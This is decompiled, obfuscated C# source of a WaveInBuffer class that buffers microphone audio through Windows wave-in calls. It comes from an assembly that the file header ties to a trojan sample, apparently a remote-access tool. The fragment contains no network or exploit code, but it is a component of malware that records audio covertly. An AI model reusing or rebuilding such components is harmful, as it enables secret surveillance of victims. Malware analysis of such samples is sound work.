// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveStreams.WaveInBuffer
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Runtime.InteropServices;

namespace xClient.Core.NAudio.Wave.WaveStreams
{
  internal class WaveInBuffer : IDisposable
  {
    private readonly ﯗ䴺釉왋詃ฬ녹㕪璢ꛤ㼤వ饤儱\uEF79狺\u0880乚找隸 header;
    private readonly int bufferSize;
    private readonly byte[] buffer;
    private GCHandle hBuffer;
    private IntPtr waveInHandle;
    private GCHandle hHeader;
    private GCHandle hThis;

    public WaveInBuffer(IntPtr waveInHandle, int bufferSize)
    {
      this.bufferSize = bufferSize;
      this.buffer = new byte[bufferSize];
      this.hBuffer = GCHandle.Alloc((object) this.buffer, GCHandleType.Pinned);
      this.waveInHandle = waveInHandle;
      this.header = new ﯗ䴺釉왋詃ฬ녹㕪璢ꛤ㼤వ饤儱\uEF79狺\u0880乚找隸();
      this.hHeader = GCHandle.Alloc((object) this.header, GCHandleType.Pinned);
      this.header.\uEE9E\u24E9墳Ᏼꇱ弛㓐剬렟寀狀훤詥삝犅靹㨵巉鏢ᘭ = this.hBuffer.AddrOfPinnedObject();
      this.header.埽ᑸハ嬫盍寔\uFFFD嘅붘\u247B㖣孠윆삦怡钴꣯蒬ﮀ鑼 = bufferSize;
      this.header.\uFFFD奏㪅貪\uFFFD뤚봧ːꉔ楅污箜랮뢇ἢ랼푒眨玺瀿 = 1;
      this.hThis = GCHandle.Alloc((object) this);
      this.header.氮䄹癕駩垹쁨\u2B39끦꿡͚\u2876\uA7BD᧓隔ꨩ鵥\uFFFD䍀呞皔 = (IntPtr) this.hThis;
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.ᘆᯁಽ\u0B91炰\uE629ږ怯ᚪ䕈\uF671仕꼓\uE391隫厝킎\u0094洐ꄯ(waveInHandle, this.header, Marshal.SizeOf((object) this.header)), "waveInPrepareHeader");
    }

    public void Reuse()
    {
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uFFFD욤猃\uD952\uDEBA䢥\uF1D2홆ꔱ戻筌\uECC4桭兇쾷즵\u2FB2끸\uFFFD费(this.waveInHandle, this.header, Marshal.SizeOf((object) this.header)), "waveUnprepareHeader");
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.ᘆᯁಽ\u0B91炰\uE629ږ怯ᚪ䕈\uF671仕꼓\uE391隫厝킎\u0094洐ꄯ(this.waveInHandle, this.header, Marshal.SizeOf((object) this.header)), "waveInPrepareHeader");
      텆䙫簻冣캶\uFFFDꪃ뗫\u28E0\uFFFD㪠\uF818궤㤿淳寎\uE6B2䁻㡅톈.蹠鬽삕闦ڋଫ퐜螰梬갻\u27EF逇쭗ద먪䐧굚ᢧῇ衜(珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uFFFD좶６\u17EB\uF509瀁\uFFFD螲쀧㬧\uEA0B螭㱡ꝇ鞵挦\uEAF8\u203Dȃ\u1374(this.waveInHandle, this.header, Marshal.SizeOf((object) this.header)), "waveInAddBuffer");
    }

    ~WaveInBuffer() => this.Dispose(false);

    public void Dispose()
    {
      GC.SuppressFinalize((object) this);
      this.Dispose(true);
    }

    protected void Dispose(bool disposing)
    {
      int num1 = disposing ? 1 : 0;
      if (this.waveInHandle != IntPtr.Zero)
      {
        int num2 = (int) 珸\u25E1단ᑊ눵ꫤ\u1AC3ꥩ\uE659珟㳓坍鎸羅㺝ܩ\u173C\u2891\u2E15힘.\uFFFD욤猃\uD952\uDEBA䢥\uF1D2홆ꔱ戻筌\uECC4桭兇쾷즵\u2FB2끸\uFFFD费(this.waveInHandle, this.header, Marshal.SizeOf((object) this.header));
        this.waveInHandle = IntPtr.Zero;
      }
      if (this.hHeader.IsAllocated)
        this.hHeader.Free();
      if (this.hBuffer.IsAllocated)
        this.hBuffer.Free();
      if (!this.hThis.IsAllocated)
        return;
      this.hThis.Free();
    }

    public byte[] Data => this.buffer;

    public bool Done => (this.header.\u1F5C倸\uE875\uEE64\uE328虫놥ᬳ썃\uF185挺춉ž埫뻸䚆\uA63Cꖆ\uF51C䄴 & 춵\uE298\uFFFD\uF128ᤲ䡵\u276C㟡ƣ탉\uFFFDᰒ燀魤돷묆褖斝驩돝.됷\uFFFD\uF35A\u2A66\u249Cະ\u223D䕇ॶ쐲ꂈ沁埦ឺ\uEB9Eਟ꺑绢\u1FC1挋) == 춵\uE298\uFFFD\uF128ᤲ䡵\u276C㟡ƣ탉\uFFFDᰒ燀魤돷묆褖斝驩돝.됷\uFFFD\uF35A\u2A66\u249Cະ\u223D䕇ॶ쐲ꂈ沁埦ឺ\uEB9Eਟ꺑绢\u1FC1挋;

    public bool InQueue => (this.header.\u1F5C倸\uE875\uEE64\uE328虫놥ᬳ썃\uF185挺춉ž埫뻸䚆\uA63Cꖆ\uF51C䄴 & 춵\uE298\uFFFD\uF128ᤲ䡵\u276C㟡ƣ탉\uFFFDᰒ燀魤돷묆褖斝驩돝.䂌䐠餜쁫礚㡫\uFFFD謥졗뢴\uF2BA奞\uEAB4氈ㅋ\uEE5C塮\u0E75镍ᆢ) == 춵\uE298\uFFFD\uF128ᤲ䡵\u276C㟡ƣ탉\uFFFDᰒ燀魤돷묆褖斝驩돝.䂌䐠餜쁫礚㡫\uFFFD謥졗뢴\uF2BA奞\uEAB4氈ㅋ\uEE5C塮\u0E75镍ᆢ;

    public int BytesRecorded => this.header.쭧焗餷昿ꪸ\u2872뵷\uF502짡\uE37F縳頄壂\u281A沚떿鏶㶾\u0F2E궳;

    public int BufferSize => this.bufferSize;
  }
}
